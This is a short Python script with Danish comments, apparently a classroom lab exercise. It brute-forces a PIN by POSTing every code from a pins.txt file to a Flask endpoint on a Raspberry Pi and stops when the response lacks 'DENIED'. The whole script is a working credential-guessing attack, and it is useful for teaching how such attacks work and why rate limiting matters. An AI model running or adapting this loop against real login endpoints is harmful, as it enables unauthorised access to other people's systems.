#---------------------------------------------------------#
#                        MODULER                          #
#---------------------------------------------------------#

# requests bruges til at sende HTTP-forespørgsler (POST/GET) til en server
import requests


#---------------------------------------------------------#
#                        VARIABLER                        #
#---------------------------------------------------------#

# URL til Flask-serveren på Raspberry Pi
# Opbygning:
#  - http://        -> protokol
#  - <ip-addresse>  -> IP-adresse på Raspberry Pi (husk at ændre den!)
#  - :5000          -> port (Flask standard)
#  - /process       -> endpoint (sti) på serveren
url = "http://<ip-addresse>:5000/process"


#---------------------------------------------------------#
#                    BRUTEFORCE-LOOP                      #
#---------------------------------------------------------#

# Åbn filen "pins.txt", som indeholder mulige pinkoder
# "r" betyder read (læs)
# encoding="UTF8" sikrer korrekt tegnsæt
with open("pins.txt", "r", encoding="UTF8") as pins:

    # Gennemgå hver linje i filen (én pinkode ad gangen)
    for pin in pins:

        # Fjern linjeskift (\n) og mellemrum
        pin = pin.strip()

        # Payload er den data vi sender til serveren
        # Flask-serveren forventer en nøgle der hedder "pincode"
        payload = {"pincode": pin}
        print(payload)

        # Send POST-request til Flask-serveren
        # data=payload betyder, at payload sendes som formular-data
        response = requests.post(url, data=payload)

        # Udskriv response-objektet (statuskode, fx 200)
        print(response)

        # Tjek serverens svar
        # Hvis svaret indeholder teksten "DENIED"
        if "DENIED" in response.text:
            print(f"PIN {pin} DENIED")

        # Ellers må pinkoden være korrekt
        else:
            print(f"""################### ACCESS WITH PIN: {pin} ####################""")

            # Stop loopet – vi har fundet den rigtige pinkode
            break
